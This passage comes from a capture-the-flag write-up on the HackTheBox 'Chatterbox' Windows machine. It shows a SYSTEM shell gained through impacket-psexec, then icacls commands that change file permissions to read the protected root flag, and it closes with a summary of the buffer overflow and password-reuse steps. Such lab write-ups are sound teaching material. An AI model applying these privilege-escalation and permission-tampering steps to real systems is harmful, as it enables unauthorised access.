Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami && ipconfig
nt authority\system

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.74
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{111D2FF5-EF2C-4D77-B44C-DBCE3AAABF4B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32> 
```

I'm `nt authority\system`!

That `impacket-psexec` will copy a service binary to the `ADMIN$` share over SMB, create a service on the remote machine pointing to the binary, remotely start the service, and when exited, stop the service and delete the binary.

**Let's read the `root.txt`!**
```shell
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
Access is denied.
```

**Hmm?... Let's check `Administrator` Desktop's permission via `icacls`:**
```shell
C:\Windows\system32> cd c:\users\administrator

c:\Users\Administrator> icacls desktop
desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)
[...]
```

As you can see, user `Alfred` has full access on `Administrator`'s Desktop directory.

```shell
c:\Users\Administrator> icacls desktop\root.txt
desktop\root.txt: Access is denied.
Successfully processed 0 files; Failed processing 1 files
```

But even `SYSTEM` user can't access to `root.txt`.

**After fumbling around, I found that user `Alfred` can access the `root.txt` file:**
```shell
c:\Users\Administrator\Desktop>whoami
whoami
chatterbox\alfred
c:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

**Now, since user `Alfred` has full access to the Desktop directory, we can use `icacls` to modify the `root.txt` file's permission:**
```shell
c:\Users\Administrator\Desktop>ICACLS root.txt /grant "Users":F
ICACLS root.txt /grant "Users":F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```

Now we can read the root flag!

## Rooted

**root.txt:**
```shell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Chatterbox/images/Pasted%20image%2020230518132648.png)

# Conclusion

What we've learned:

1. Exploiting aChat's Remote Buffer Overflow
2. Enumerating Passwords
3. Port Forwarding Via `chisel`
4. Vertical Privilege Escalation Via Password Reuse